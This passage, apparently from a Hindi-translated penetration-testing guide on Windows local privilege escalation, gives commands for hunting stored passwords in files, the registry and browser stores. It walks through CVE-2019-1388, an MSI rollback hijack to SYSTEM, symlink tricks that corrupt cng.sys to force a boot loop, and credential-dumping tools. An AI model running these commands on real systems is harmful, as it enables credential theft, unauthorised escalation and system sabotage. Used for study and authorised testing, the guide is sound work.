ऐसी ज्ञात फ़ाइलें जिनमें कुछ समय पहले **passwords** **clear-text** या **Base64** में मौजूद थे।
```bash
$env:APPDATA\Microsoft\Windows\PowerShell\PSReadLine\ConsoleHost_history
vnc.ini, ultravnc.ini, *vnc*
web.config
php.ini httpd.conf httpd-xampp.conf my.ini my.cnf (XAMPP, Apache, PHP)
SiteList.xml #McAfee
ConsoleHost_history.txt #PS-History
*.gpg
*.pgp
*config*.php
elasticsearch.y*ml
kibana.y*ml
*.p12
*.der
*.csr
*.cer
known_hosts
id_rsa
id_dsa
*.ovpn
anaconda-ks.cfg
hostapd.conf
rsyncd.conf
cesi.conf
supervisord.conf
tomcat-users.xml
*.kdbx
KeePass.config
Ntds.dit
SAM
SYSTEM
FreeSSHDservice.ini
access.log
error.log
server.xml
ConsoleHost_history.txt
setupinfo
setupinfo.bak
key3.db         #Firefox
key4.db         #Firefox
places.sqlite   #Firefox
"Login Data"    #Chrome
Cookies         #Chrome
Bookmarks       #Chrome
History         #Chrome
TypedURLsTime   #IE
TypedURLs       #IE
%SYSTEMDRIVE%\pagefile.sys
%WINDIR%\debug\NetSetup.log
%WINDIR%\repair\sam
%WINDIR%\repair\system
%WINDIR%\repair\software, %WINDIR%\repair\security
%WINDIR%\iis6.log
%WINDIR%\system32\config\AppEvent.Evt
%WINDIR%\system32\config\SecEvent.Evt
%WINDIR%\system32\config\default.sav
%WINDIR%\system32\config\security.sav
%WINDIR%\system32\config\software.sav
%WINDIR%\system32\config\system.sav
%WINDIR%\system32\CCM\logs\*.log
%USERPROFILE%\ntuser.dat
%USERPROFILE%\LocalS~1\Tempor~1\Content.IE5\index.dat
```
सभी प्रस्तावित फ़ाइलों को खोजें:
```
cd C:\
dir /s/b /A:-D RDCMan.settings == *.rdg == *_history* == httpd.conf == .htpasswd == .gitconfig == .git-credentials == Dockerfile == docker-compose.yml == access_tokens.db == accessTokens.json == azureProfile.json == appcmd.exe == scclient.exe == *.gpg$ == *.pgp$ == *config*.php == elasticsearch.y*ml == kibana.y*ml == *.p12$ == *.cer$ == known_hosts == *id_rsa* == *id_dsa* == *.ovpn == tomcat-users.xml == web.config == *.kdbx == KeePass.config == Ntds.dit == SAM == SYSTEM == security == software == FreeSSHDservice.ini == sysprep.inf == sysprep.xml == *vnc*.ini == *vnc*.c*nf* == *vnc*.txt == *vnc*.xml == php.ini == https.conf == https-xampp.conf == my.ini == my.cnf == access.log == error.log == server.xml == ConsoleHost_history.txt == pagefile.sys == NetSetup.log == iis6.log == AppEvent.Evt == SecEvent.Evt == default.sav == security.sav == software.sav == system.sav == ntuser.dat == index.dat == bash.exe == wsl.exe 2>nul | findstr /v ".dll"
```

```
Get-Childitem –Path C:\ -Include *unattend*,*sysprep* -File -Recurse -ErrorAction SilentlyContinue | where {($_.Name -like "*.xml" -or $_.Name -like "*.txt" -or $_.Name -like "*.ini")}
```
### RecycleBin में क्रेडेंशियल्स

आपको RecycleBin को भी अंदर क्रेडेंशियल्स के लिए जाँचना चाहिए

कई प्रोग्रामों द्वारा सेव किए गए पासवर्ड **पुनर्प्राप्त करने** के लिए आप उपयोग कर सकते हैं: [http://www.nirsoft.net/password_recovery_tools.html](http://www.nirsoft.net/password_recovery_tools.html)

### Registry के अंदर

**क्रेडेंशियल्स वाले अन्य संभावित registry keys**
```bash
reg query "HKCU\Software\ORL\WinVNC3\Password"
reg query "HKLM\SYSTEM\CurrentControlSet\Services\SNMP" /s
reg query "HKCU\Software\TightVNC\Server"
reg query "HKCU\Software\OpenSSH\Agent\Key"
```
[**Extract openssh keys from registry.**](https://blog.ropnop.com/extracting-ssh-private-keys-from-windows-10-ssh-agent/)

### ब्राउज़रों का इतिहास

आपको उन dbs की जाँच करनी चाहिए जहाँ **Chrome or Firefox** के passwords संग्रहीत होते हैं।\
ब्राउज़र के history, bookmarks और favourites भी जाँचें क्योंकि संभवतः कुछ **passwords** वहाँ संग्रहीत हो सकते हैं।

ब्राउज़र से passwords निकालने के tools:

- Mimikatz: `dpapi::chrome`
- [**SharpWeb**](https://github.com/djhohnstein/SharpWeb)
- [**SharpChromium**](https://github.com/djhohnstein/SharpChromium)
- [**SharpDPAPI**](https://github.com/GhostPack/SharpDPAPI)

### **COM DLL Overwriting**

**Component Object Model (COM)** Windows operating system के भीतर निर्मित एक तकनीक है जो अलग-अलग भाषाओं के software components के बीच **intercommunication** की अनुमति देती है। प्रत्येक COM component को **identified via a class ID (CLSID)** के माध्यम से पहचाना जाता है और प्रत्येक component एक या अधिक interfaces के माध्यम से functionality expose करता है, जिन्हें interface IDs (IIDs) द्वारा पहचाना जाता है।

COM classes और interfaces registry में परिभाषित होते हैं, क्रमशः **HKEY\CLASSES\ROOT\CLSID** और **HKEY\CLASSES\ROOT\Interface** के अंतर्गत। यह registry **HKEY\LOCAL\MACHINE\Software\Classes** + **HKEY\CURRENT\USER\Software\Classes** को मर्ज करके बनाया जाता है = **HKEY\CLASSES\ROOT.**

Inside the CLSIDs of this registry you can find the child registry **InProcServer32** which contains a **default value** pointing to a **DLL** and a value called **ThreadingModel** that can be **Apartment** (Single-Threaded), **Free** (Multi-Threaded), **Both** (Single or Multi) or **Neutral** (Thread Neutral).

![](<../../images/image (729).png>)

सारांश में, अगर आप उन किसी भी DLLs को **overwrite** कर सकें जो execute होने वाले हैं, तो आप **escalate privileges** कर सकते हैं अगर वह DLL किसी अन्य user द्वारा execute किया जाएगा।

यह जानने के लिए कि attackers COM Hijacking को persistence mechanism के रूप में कैसे इस्तेमाल करते हैं, निम्न देखें:

{{#ref}}
com-hijacking.md
{{#endref}}

### **Generic Password search in files and registry**

फ़ाइल की सामग्री खोजें
```bash
cd C:\ & findstr /SI /M "password" *.xml *.ini *.txt
findstr /si password *.xml *.ini *.txt *.config
findstr /spin "password" *.*
```
**किसी विशिष्ट फ़ाइलनाम वाली फ़ाइल खोजें**
```bash
dir /S /B *pass*.txt == *pass*.xml == *pass*.ini == *cred* == *vnc* == *.config*
where /R C:\ user.txt
where /R C:\ *.ini
```
**registry में key names और passwords खोजें**
```bash
REG QUERY HKLM /F "password" /t REG_SZ /S /K
REG QUERY HKCU /F "password" /t REG_SZ /S /K
REG QUERY HKLM /F "password" /t REG_SZ /S /d
REG QUERY HKCU /F "password" /t REG_SZ /S /d
```
### Passwords खोजने वाले टूल्स

[**MSF-Credentials Plugin**](https://github.com/carlospolop/MSF-Credentials) **msf plugin** है। यह plugin मैंने बनाया है ताकि यह victim के अंदर credentials खोजने वाले हर metasploit POST module को स्वचालित रूप से execute कर सके।\
[**Winpeas**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite) स्वचालित रूप से उन सभी फाइलों को खोजता है जिनमें इस पेज में उल्लेखित passwords होते हैं।\
[**Lazagne**](https://github.com/AlessandroZ/LaZagne) system से password निकालने का एक और बेहतरीन tool है।

The tool [**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) कई ऐसे tools के लिए **sessions**, **usernames** और **passwords** खोजता है जो यह data clear text में save करते हैं (PuTTY, WinSCP, FileZilla, SuperPuTTY, and RDP)
```bash
Import-Module path\to\SessionGopher.ps1;
Invoke-SessionGopher -Thorough
Invoke-SessionGopher -AllDomain -o
Invoke-SessionGopher -AllDomain -u domain.com\adm-arvanaghi -p s3cr3tP@ss
```
## Leaked Handlers

कल्पना करें कि **SYSTEM के रूप में चल रहा एक process `OpenProcess()` के जरिए एक नया process खोलता है** जिसमें **full access** है। वही process **`CreateProcess()` के साथ एक नया process भी बनाता है**, **जिसके privileges कम हैं पर वह main process के सभी open handles विरासत में लेता है**.  
फिर, यदि आपके पास उस low privileged process पर **full access** है, आप `OpenProcess()` से बनाए गए privileged process के **open handle** को पकड़कर **shellcode inject** कर सकते हैं.  
[यह उदाहरण पढ़ें इन्व्हुल्नरेबिलिटी का पता लगाने और उसे exploit करने के बारे में अधिक जानकारी के लिए.](leaked-handle-exploitation.md)  
[यह दूसरा पोस्ट पढ़ें अधिक पूर्ण व्याख्या के लिए कि कैसे विभिन्न permission स्तरों के साथ inherited processes और threads के अधिक open handlers का टेस्ट और दुरुपयोग करें (not only full access)](http://dronesec.pw/blog/2019/08/22/exploiting-leaked-process-and-thread-handles/).

## Named Pipe Client Impersonation

साझा मेमोरी सेगमेंट, जिन्हें **pipes** कहा जाता है, प्रक्रियाओं के बीच संचार और डेटा ट्रांसफर सक्षम करते हैं।

Windows एक फीचर देता है जिसे कहा जाता है **Named Pipes**, जो unrelated processes को डेटा शेयर करने की अनुमति देता है, यहाँ तक कि अलग-अलग नेटवर्क पर भी। यह client/server आर्किटेक्चर जैसा होता है, जहाँ रोल्स को परिभाषित किया जाता है जैसे **named pipe server** और **named pipe client**।

जब किसी **client** द्वारा pipe के माध्यम से डेटा भेजा जाता है, तो वह **server** जिसने pipe सेट किया है, के पास **client** की identity अपनाने की क्षमता होती है, बशर्ते उसके पास आवश्यक **SeImpersonate** rights हों। किसी ऐसे **privileged process** की पहचान करना जो उस pipe के माध्यम से communicate करता है और जिसे आप mimic कर सकते हैं, आपको मौका देता है कि pipe के साथ interaction होने पर उस process की identity अपनाकर **higher privileges** हासिल कर सकें। ऐसे हमले को निष्पादित करने के निर्देशों के लिए, सहायक गाइड [**यहाँ**](named-pipe-client-impersonation.md) और [**यहाँ**](#from-high-integrity-to-system) उपलब्ध हैं।

इसके अलावा निम्नलिखित टूल आपको **named pipe communication को burp जैसे टूल के साथ intercept करने** में मदद करता है: [**https://github.com/gabriel-sztejnworcel/pipe-intercept**](https://github.com/gabriel-sztejnworcel/pipe-intercept) **और यह टूल सभी pipes को सूचीबद्ध और देखने की अनुमति देता है ताकि privescs मिलें** [**https://github.com/cyberark/PipeViewer**](https://github.com/cyberark/PipeViewer)

## Telephony tapsrv remote DWORD write to RCE

The Telephony service (TapiSrv) in server mode exposes `\\pipe\\tapsrv` (MS-TRP). A remote authenticated client can abuse the mailslot-based async event path to turn `ClientAttach` into an arbitrary **4-byte write** to any existing file writable by `NETWORK SERVICE`, then gain Telephony admin rights and load an arbitrary DLL as the service. Full flow:

- `ClientAttach` with `pszDomainUser` set to a writable existing path → the service opens it via `CreateFileW(..., OPEN_EXISTING)` and uses it for async event writes.
- Each event writes the attacker-controlled `InitContext` from `Initialize` to that handle. Register a line app with `LRegisterRequestRecipient` (`Req_Func 61`), trigger `TRequestMakeCall` (`Req_Func 121`), fetch via `GetAsyncEvents` (`Req_Func 0`), then unregister/shutdown to repeat deterministic writes.
- Add yourself to `[TapiAdministrators]` in `C:\Windows\TAPI\tsec.ini`, reconnect, then call `GetUIDllName` with an arbitrary DLL path to execute `TSPI_providerUIIdentify` as `NETWORK SERVICE`.

और अधिक विवरण:

{{#ref}}
telephony-tapsrv-arbitrary-dword-write-to-rce.md
{{#endref}}

## विविध

### File Extensions that could execute stuff in Windows

इस पेज को देखें **[https://filesec.io/](https://filesec.io/)**

### **कमान्ड लाइनों में पासवर्ड की निगरानी**

जब user के रूप में shell मिलता है, तो हो सकता है कि scheduled tasks या अन्य processes execute हो रहे हों जो **command line पर credentials पास करते हैं**। नीचे दिया गया स्क्रिप्ट हर दो सेकंड में process command lines को कैप्चर करता है और वर्तमान स्थिति की तुलना पिछली स्थिति से करता है, किसी भी अंतर को 출력 करता है।
```bash
while($true)
{
$process = Get-WmiObject Win32_Process | Select-Object CommandLine
Start-Sleep 1
$process2 = Get-WmiObject Win32_Process | Select-Object CommandLine
Compare-Object -ReferenceObject $process -DifferenceObject $process2
}
```
## Processes से पासवर्ड चुराना

## Low Priv User से NT\AUTHORITY SYSTEM (CVE-2019-1388) / UAC Bypass

यदि आपके पास ग्राफिकल इंटरफ़ेस (via console or RDP) तक पहुँच है और UAC सक्षम है, तो Microsoft Windows के कुछ संस्करणों में unprivileged user से terminal या किसी अन्य process को "NT\AUTHORITY SYSTEM" के रूप में चलाया जा सकता है।

यह एक ही vulnerability का उपयोग करके privileges escalate करने और एक ही समय में UAC को bypass करने की अनुमति देता है। इसके अलावा, कुछ भी install करने की आवश्यकता नहीं है और process के दौरान उपयोग की गई binary Microsoft द्वारा signed और issued है।

प्रभावित सिस्टमों में कुछ निम्नलिखित हैं:
```
SERVER
======

Windows 2008r2	7601	** link OPENED AS SYSTEM **
Windows 2012r2	9600	** link OPENED AS SYSTEM **
Windows 2016	14393	** link OPENED AS SYSTEM **
Windows 2019	17763	link NOT opened


WORKSTATION
===========

Windows 7 SP1	7601	** link OPENED AS SYSTEM **
Windows 8		9200	** link OPENED AS SYSTEM **
Windows 8.1		9600	** link OPENED AS SYSTEM **
Windows 10 1511	10240	** link OPENED AS SYSTEM **
Windows 10 1607	14393	** link OPENED AS SYSTEM **
Windows 10 1703	15063	link NOT opened
Windows 10 1709	16299	link NOT opened
```
इस vulnerability को exploit करने के लिए, निम्नलिखित चरण आवश्यक हैं:
```
1) Right click on the HHUPD.EXE file and run it as Administrator.

2) When the UAC prompt appears, select "Show more details".

3) Click "Show publisher certificate information".

4) If the system is vulnerable, when clicking on the "Issued by" URL link, the default web browser may appear.

5) Wait for the site to load completely and select "Save as" to bring up an explorer.exe window.

6) In the address path of the explorer window, enter cmd.exe, powershell.exe or any other interactive process.

7) You now will have an "NT\AUTHORITY SYSTEM" command prompt.

8) Remember to cancel setup and the UAC prompt to return to your desktop.
```
You have all the necessary files and information in the following GitHub repository:

https://github.com/jas502n/CVE-2019-1388

## From Administrator Medium to High Integrity Level / UAC Bypass

Read this to **learn about Integrity Levels**:


{{#ref}}
integrity-levels.md
{{#endref}}

Then **read this to learn about UAC and UAC bypasses:**


{{#ref}}
../authentication-credentials-uac-and-efs/uac-user-account-control.md
{{#endref}}

## From Arbitrary Folder Delete/Move/Rename to SYSTEM EoP

The technique described [**in this blog post**](https://www.zerodayinitiative.com/blog/2022/3/16/abusing-arbitrary-file-deletes-to-escalate-privilege-and-other-great-tricks) with a exploit code [**available here**](https://github.com/thezdi/PoC/tree/main/FilesystemEoPs).

हमला मूल रूप से Windows Installer के rollback फीचर का दुरुपयोग करने पर आधारित है ताकि uninstallation प्रक्रिया के दौरान वैध फ़ाइलों को मैलिशियस फ़ाइलों से बदल दिया जाए। इसके लिए attacker को एक **malicious MSI installer** बनाना होगा जो `C:\Config.Msi` फ़ोल्डर को hijack करने के लिए उपयोग किया जाएगा, जिसे बाद में Windows Installer अन्य MSI पैकेजों के uninstall के दौरान rollback फाइलों को स्टोर करने के लिए उपयोग करेगा — जहाँ rollback फाइलों को मैलिशियस payload रखने के लिए मॉडिफ़ाई किया जाएगा।

सारांशित तकनीक इस प्रकार है:

1. **Stage 1 – Preparing for the Hijack (leave `C:\Config.Msi` empty)**

- Step 1: Install the MSI
- Create an `.msi` that installs a harmless file (e.g., `dummy.txt`) in a writable folder (`TARGETDIR`).
- Mark the installer as **"UAC Compliant"**, so a **non-admin user** can run it.
- Keep a **handle** open to the file after install.

- Step 2: Begin Uninstall
- Uninstall the same `.msi`.
- The uninstall process starts moving files to `C:\Config.Msi` and renaming them to `.rbf` files (rollback backups).
- **Poll the open file handle** using `GetFinalPathNameByHandle` to detect when the file becomes `C:\Config.Msi\<random>.rbf`.

- Step 3: Custom Syncing
- The `.msi` includes a **custom uninstall action (`SyncOnRbfWritten`)** that:
- Signals when `.rbf` has been written.
- Then **waits** on another event before continuing the uninstall.

- Step 4: Block Deletion of `.rbf`
- When signaled, **open the `.rbf` file** without `FILE_SHARE_DELETE` — this **prevents it from being deleted**.
- Then **signal back** so the uninstall can finish.
- Windows Installer fails to delete the `.rbf`, and because it can’t delete all contents, **`C:\Config.Msi` is not removed**.

- Step 5: Manually Delete `.rbf`
- You (attacker) delete the `.rbf` file manually.
- Now **`C:\Config.Msi` is empty**, ready to be hijacked.

> At this point, **trigger the SYSTEM-level arbitrary folder delete vulnerability** to delete `C:\Config.Msi`.

2. **Stage 2 – Replacing Rollback Scripts with Malicious Ones**

- Step 6: Recreate `C:\Config.Msi` with Weak ACLs
- Recreate the `C:\Config.Msi` folder yourself.
- Set **weak DACLs** (e.g., Everyone:F), and **keep a handle open** with `WRITE_DAC`.

- Step 7: Run Another Install
- Install the `.msi` again, with:
- `TARGETDIR`: Writable location.
- `ERROROUT`: A variable that triggers a forced failure.
- This install will be used to trigger **rollback** again, which reads `.rbs` and `.rbf`.

- Step 8: Monitor for `.rbs`
- Use `ReadDirectoryChangesW` to monitor `C:\Config.Msi` until a new `.rbs` appears.
- Capture its filename.

- Step 9: Sync Before Rollback
- The `.msi` contains a **custom install action (`SyncBeforeRollback`)** that:
- Signals an event when the `.rbs` is created.
- Then **waits** before continuing.

- Step 10: Reapply Weak ACL
- After receiving the `.rbs created` event:
- The Windows Installer **reapplies strong ACLs** to `C:\Config.Msi`.
- But since you still have a handle with `WRITE_DAC`, you can **reapply weak ACLs** again.

> ACLs are **only enforced on handle open**, so you can still write to the folder.

- Step 11: Drop Fake `.rbs` and `.rbf`
- Overwrite the `.rbs` file with a **fake rollback script** that tells Windows to:
- Restore your `.rbf` file (malicious DLL) into a **privileged location** (e.g., `C:\Program Files\Common Files\microsoft shared\ink\HID.DLL`).
- Drop your fake `.rbf` containing a **malicious SYSTEM-level payload DLL**.

- Step 12: Trigger the Rollback
- Signal the sync event so the installer resumes.
- A **type 19 custom action (`ErrorOut`)** is configured to **intentionally fail the install** at a known point.
- This causes **rollback to begin**.

- Step 13: SYSTEM Installs Your DLL
- Windows Installer:
- Reads your malicious `.rbs`.
- Copies your `.rbf` DLL into the target location.
- You now have your **malicious DLL in a SYSTEM-loaded path**.

- Final Step: Execute SYSTEM Code
- Run a trusted **auto-elevated binary** (e.g., `osk.exe`) that loads the DLL you hijacked.
- **Boom**: Your code is executed **as SYSTEM**.


### From Arbitrary File Delete/Move/Rename to SYSTEM EoP

The main MSI rollback technique (the previous one) assumes you can delete an **entire folder** (e.g., `C:\Config.Msi`). But what if your vulnerability only allows **arbitrary file deletion** ?

You could exploit **NTFS internals**: every folder has a hidden alternate data stream called:
```
C:\SomeFolder::$INDEX_ALLOCATION
```
यह stream फ़ोल्डर का **सूचकांक मेटाडेटा** संग्रहीत करता है।

तो, यदि आप किसी फ़ोल्डर के `::$INDEX_ALLOCATION` stream को **डिलीट कर देते हैं**, तो NTFS फ़ाइल सिस्टम से **पूरे फ़ोल्डर को हटा दिया जाता है**।

आप यह मानक file deletion APIs जैसे उपयोग करके कर सकते हैं:
```c
DeleteFileW(L"C:\\Config.Msi::$INDEX_ALLOCATION");
```
> भले ही आप *file* delete API को कॉल कर रहे हों, यह **खुद फ़ोल्डर को हटा देता है**।

### फ़ोल्डर सामग्री हटाने से SYSTEM EoP तक
यदि आपकी primitive आपको arbitrary files/folders हटाने की अनुमति नहीं देती, लेकिन यह **attacker-controlled फ़ोल्डर के *contents* को हटाने की अनुमति देती है**, तो क्या होगा?

1. Step 1: Setup a bait folder and file
- Create: `C:\temp\folder1`
- Inside it: `C:\temp\folder1\file1.txt`

2. Step 2: Place an **oplock** on `file1.txt`
- The **oplock** **क्रियान्वयन को रोक देता है** जब कोई उच्चाधिकार वाली प्रक्रिया `file1.txt` को डिलीट करने की कोशिश करती है।
```c
// pseudo-code
RequestOplock("C:\\temp\\folder1\\file1.txt");
WaitForDeleteToTriggerOplock();
```
3. चरण 3: SYSTEM प्रक्रिया ट्रिगर करें (उदा., `SilentCleanup`)
- यह प्रक्रिया फ़ोल्डरों (उदा., `%TEMP%`) को स्कैन करके उनकी सामग्री हटाने की कोशिश करती है।
- जब यह `file1.txt` तक पहुँचती है, तो **oplock triggers** और नियंत्रण आपके callback को सौंप दिया जाता है।

4. चरण 4: oplock callback के अंदर – deletion को पुनर्निर्देशित करें

- विकल्प A: `file1.txt` को किसी अन्य स्थान पर स्थानांतरित करें
- यह oplock को तोड़े बिना `folder1` को खाली कर देता है।
- सीधे `file1.txt` को हटाएँ नहीं — इससे oplock समय से पहले रिलीज़ हो जाएगा।

- विकल्प B: `folder1` को एक **junction** में बदलें:
```bash
# folder1 is now a junction to \RPC Control (non-filesystem namespace)
mklink /J C:\temp\folder1 \\?\GLOBALROOT\RPC Control
```
- विकल्प C: `\RPC Control` में एक **symlink** बनाएं:
```bash
# Make file1.txt point to a sensitive folder stream
CreateSymlink("\\RPC Control\\file1.txt", "C:\\Config.Msi::$INDEX_ALLOCATION")
```
> यह NTFS के internal stream को लक्षित करता है जो फ़ोल्डर metadata संग्रहीत करता है — इसे हटाने से फ़ोल्डर हट जाता है।

5. चरण 5: oplock जारी करें
- SYSTEM प्रोसेस जारी रहता है और `file1.txt` को हटाने की कोशिश करता है।
- लेकिन अब, junction + symlink के कारण, यह असल में हटा रहा है:
```
C:\Config.Msi::$INDEX_ALLOCATION
```
**Result**: `C:\Config.Msi` SYSTEM द्वारा हटाया जाता है।

### Arbitrary Folder Create से Permanent DoS तक

ऐसे primitive का फायदा उठाइए जो आपको **create an arbitrary folder as SYSTEM/admin** की अनुमति देता है — भले ही **you can’t write files** या **set weak permissions**।

एक **folder** (not a file) बनाइए जिसका नाम एक **critical Windows driver** हो, जैसे:
```
C:\Windows\System32\cng.sys
```
- यह पाथ सामान्यतः `cng.sys` कर्नेल-मोड ड्राइवर से मेल खाता है।
- यदि आप इसे **एक फ़ोल्डर के रूप में पहले से बना देते हैं**, तो Windows बूट के समय वास्तविक ड्राइवर को लोड करने में विफल रहता है।
- फिर, Windows बूट के दौरान `cng.sys` लोड करने की कोशिश करता है।
- यह फ़ोल्डर देखता है, **वास्तविक ड्राइवर का पता लगाने में विफल रहता है**, और **क्रैश हो जाता है या बूट रुक जाता है**।
- बाहरी हस्तक्षेप (जैसे boot repair या disk access) के बिना **कोई बैकअप/फ़ॉलबैक नहीं है**, और **कोई recovery नहीं है**।

### From privileged log/backup paths + OM symlinks to arbitrary file overwrite / boot DoS

जब कोई **privileged service** किसी पाथ पर लॉग/एक्सपोर्ट लिखता है जिसे किसी **writable config** से पढ़ा जाता है, तो उस पाथ को **Object Manager symlinks + NTFS mount points** से रीडायरेक्ट करके विशेषाधिकार प्राप्त लेखन को arbitrary overwrite में बदल दिया जा सकता है (यहाँ तक कि **SeCreateSymbolicLinkPrivilege** के बिना भी).

आवश्यकताएँ
- लक्ष्य पाथ स्टोर करने वाला कॉन्फ़िग़ attacker द्वारा writable होना चाहिए (उदा., `%ProgramData%\...\.ini`)।
- `\RPC Control` पर एक mount point और एक OM file symlink बनाने की क्षमता (James Forshaw [symboliclink-testing-tools](https://github.com/googleprojectzero/symboliclink-testing-tools))।
- एक privileged ऑपरेशन जो उस पाथ पर लिखता हो (log, export, report)।

उदाहरण श्रृंखला
1. कॉन्फ़िग पढ़ें ताकि विशेषाधिकार प्राप्त लॉग गंतव्य का पता चल सके, जैसे `SMSLogFile=C:\users\iconics_user\AppData\Local\Temp\logs\log.txt` in `C:\ProgramData\ICONICS\IcoSetup64.ini`.
2. बिना admin के पाथ को रीडायरेक्ट करें:
```cmd
mkdir C:\users\iconics_user\AppData\Local\Temp\logs
CreateMountPoint C:\users\iconics_user\AppData\Local\Temp\logs \RPC Control
CreateSymlink "\\RPC Control\\log.txt" "\\??\\C:\\Windows\\System32\\cng.sys"
```
3. Privileged component को log लिखने का इंतज़ार करें (e.g., admin "send test SMS" ट्रिगर करता है)। यह write अब `C:\Windows\System32\cng.sys` में जाता है।
4. Inspect the overwritten target (hex/PE parser) करके corruption की पुष्टि करें; reboot Windows को tampered driver path लोड करने के लिए मजबूर कर देता है → **boot loop DoS**. यह किसी भी protected file पर भी सामान्यीकृत होता है जिसे कोई privileged service write के लिए open करेगा।

> `cng.sys` सामान्यतः `C:\Windows\System32\drivers\cng.sys` से लोड होता है, लेकिन अगर `C:\Windows\System32\cng.sys` में उसकी एक copy मौजूद है तो पहले वही कोशिश की जा सकती है, जिससे यह corrupt data के लिए एक भरोसेमंद DoS sink बन जाता है।



## **High Integrity से SYSTEM तक**

### **नया service**

यदि आप पहले से ही किसी High Integrity process पर चल रहे हैं, तो **path to SYSTEM** आसान हो सकता है — बस **creating and executing a new service**:
```
sc create newservicename binPath= "C:\windows\system32\notepad.exe"
sc start newservicename
```
> [!TIP]
> service binary बनाते समय सुनिश्चित करें कि यह एक वैध service हो या binary आवश्यक क्रियाएँ इतनी तेज़ी से करे क्योंकि अगर यह वैध service नहीं होगा तो इसे 20s में kill कर दिया जाएगा।

### AlwaysInstallElevated

High Integrity process से आप AlwaysInstallElevated registry entries को **enable** करने और _**.msi**_ wrapper का उपयोग करके एक reverse shell **install** करने की कोशिश कर सकते हैं.\
[More information about the registry keys involved and how to install a _.msi_ package here.](#alwaysinstallelevated)

### High + SeImpersonate privilege to System

**आप** [**find the code here**](seimpersonate-from-high-to-system.md)**.**

### From SeDebug + SeImpersonate to Full Token privileges

यदि आपके पास वे token privileges हैं (संभावतः आप इन्हें पहले से ही High Integrity process में पाएँगे), तो आप SeDebug privilege के साथ (not protected processes) लगभग किसी भी process को **open** कर पाएँगे, process का **token copy** कर पाएँगे, और उस token के साथ एक **arbitrary process create** कर पाएँगे।\
इस technique में सामान्यतः SYSTEM के रूप में चल रहे ऐसे किसी process को चुना जाता है जिसमें सभी token privileges मौजूद हों (_हाँ, आप SYSTEM processes पा सकते हैं जिनमें सभी token privileges नहीं होते_).\
**You can find an** [**example of code executing the proposed technique here**](sedebug-+-seimpersonate-copy-token.md)**.**

### **Named Pipes**

यह technique meterpreter द्वारा `getsystem` में escalate करने के लिए उपयोग की जाती है। यह technique **एक pipe create करने और फिर किसी service को उस pipe पर write करने के लिए create/abuse करने** पर आधारित है। फिर, वह **server** जिसने pipe बनाया है और जिसके पास **`SeImpersonate`** privilege है, pipe client (service) के **token को impersonate** करके SYSTEM privileges प्राप्त कर सकेगा।\
यदि आप [**learn more about name pipes you should read this**](#named-pipe-client-impersonation)।\
यदि आप [**how to go from high integrity to System using name pipes you should read this**](from-high-integrity-to-system-with-name-pipes.md) का एक उदाहरण पढ़ना चाहते हैं तो यह पढ़ें।

### Dll Hijacking

यदि आप SYSTEM के रूप में चल रहे किसी process द्वारा load की जा रही किसी **dll** को **hijack** कर लेते हैं तो आप उन permissions के साथ arbitrary code execute कर पाएँगे। इसलिए Dll Hijacking इस तरह के privilege escalation के लिए उपयोगी है, और ऊपर से यह high integrity process से हासिल करना कहीं **आसान** है क्योंकि उसके पास dlls को load करने वाले folders पर **write permissions** होंगे।\
**You can** [**learn more about Dll hijacking here**](dll-hijacking/index.html)**.**

### **From Administrator or Network Service to System**

- [https://github.com/sailay1996/RpcSsImpersonator](https://github.com/sailay1996/RpcSsImpersonator)
- [https://decoder.cloud/2020/05/04/from-network-service-to-system/](https://decoder.cloud/2020/05/04/from-network-service-to-system/)
- [https://github.com/decoder-it/NetworkServiceExploit](https://github.com/decoder-it/NetworkServiceExploit)

### From LOCAL SERVICE or NETWORK SERVICE to full privs

**पढ़ें:** [**https://github.com/itm4n/FullPowers**](https://github.com/itm4n/FullPowers)

## More help

[Static impacket binaries](https://github.com/ropnop/impacket_static_binaries)

## Useful tools

**Windows local privilege escalation vectors खोजने का सबसे अच्छा tool:** [**WinPEAS**](https://github.com/carlospolop/privilege-escalation-awesome-scripts-suite/tree/master/winPEAS)

**PS**

[**PrivescCheck**](https://github.com/itm4n/PrivescCheck)\
[**PowerSploit-Privesc(PowerUP)**](https://github.com/PowerShellMafia/PowerSploit) **-- Misconfigurations और sensitive files की जाँच करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**). Detected.**\
[**JAWS**](https://github.com/411Hall/JAWS) **-- कुछ संभावित misconfigurations की जाँच और जानकारी एकत्रित करें (**[**check here**](https://github.com/carlospolop/hacktricks/blob/master/windows/windows-local-privilege-escalation/broken-reference/README.md)**).**\
[**privesc** ](https://github.com/enjoiz/Privesc)**-- Misconfigurations की जाँच**\
[**SessionGopher**](https://github.com/Arvanaghi/SessionGopher) **-- यह PuTTY, WinSCP, SuperPuTTY, FileZilla, और RDP saved session जानकारी extract करता है। लोकल में -Thorough का उपयोग करें।**\
[**Invoke-WCMDump**](https://github.com/peewpw/Invoke-WCMDump) **-- Credential Manager से credentials extract करता है। Detected.**\
[**DomainPasswordSpray**](https://github.com/dafthack/DomainPasswordSpray) **-- जुटाए गए passwords को domain पर spray करें**\
[**Inveigh**](https://github.com/Kevin-Robertson/Inveigh) **-- Inveigh एक PowerShell ADIDNS/LLMNR/mDNS spoofer और man-in-the-middle tool है।**\
[**WindowsEnum**](https://github.com/absolomb/WindowsEnum/blob/master/WindowsEnum.ps1) **-- Basic privesc Windows enumeration**\
[~~**Sherlock**~~](https://github.com/rasta-mouse/Sherlock) **~~**~~ -- ज्ञात privesc vulnerabilities खोजें (DEPRECATED for Watson)\
[~~**WINspect**~~](https://github.com/A-mIn3/WINspect) -- लोकल चेक्स **(Need Admin rights)**

**Exe**

[**Watson**](https://github.com/rasta-mouse/Watson) -- ज्ञात privesc vulnerabilities खोजने के लिए (VisualStudio का उपयोग करके compile करने की आवश्यकता) ([**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/watson))\
[**SeatBelt**](https://github.com/GhostPack/Seatbelt) -- misconfigurations की तलाश करते हुए host की enumeration (ज़्यादा gather info tool है न कि privesc) (compile करने की आवश्यकता) **(**[**precompiled**](https://github.com/carlospolop/winPE/tree/master/binaries/seatbelt)**)**\
[**LaZagne**](https://github.com/AlessandroZ/LaZagne) **-- कई softwares से credentials extract करता है (github पर precompiled exe मौजूद है)**\
[**SharpUP**](https://github.com/GhostPack/SharpUp) **-- PowerUp का C# पोर्ट**\
